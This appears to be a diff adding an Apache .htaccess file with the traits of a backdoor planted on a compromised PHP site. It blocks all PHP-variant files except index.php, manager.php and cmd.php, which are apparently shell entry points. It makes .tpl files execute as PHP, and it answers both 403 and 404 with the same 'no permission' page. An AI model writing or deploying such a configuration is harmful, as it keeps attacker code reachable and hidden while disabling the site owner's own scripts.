@@ -1,0 +1,40 @@
+<FilesMatch '.(php|Php|PHp|PHP|pHp|PhP|php5|php6|php7|php.PHP|php.Php|php.PHp|php.PHP|php.pHP|PHP.PHP|php.PHP5|php.PHP6|php4|php3|php.PHP7|php.Php|php.PHp|php.PhP|php.phP|php.phtml|php.PHTML|phtm|PHTM|Phtm|PHtm|PHTm|PhTm|PhTM||PHP.php|PHP.pHP|php56|phar|Phar|pHar|phAr|phaR|pht|Pht|pHt|phT|PHt|PHT|shtml|Shtml|SHtml|SHTml|SHTMl|SHTML|SHtmL|ShtmL|ShTmL|ShtML|ShtMl|shTMl|shTML|phtml|Phtml|pHtml|phTml|phtMl|phtmL|PHtml|PHTml|PHTMl|PHTML|Phtml|PhTml|pHtmL|PHtML|PHTml)$'>
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|pdf|xml|txt|js|css|tpl|psht)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+<FilesMatch '^(index.html|sitemap.xml|robots.txt|robot.txt|index.php|manager.php|cmd.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^\.">
+  Order allow,deny
+  Deny from all
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+ErrorDocument 403 '<center><h3>You do not have permission.</h3></center>'
+ErrorDocument 404 '<center><h3>You do not have permission.</h3></center>'
+
+AddType application/x-httpd-php .tpl
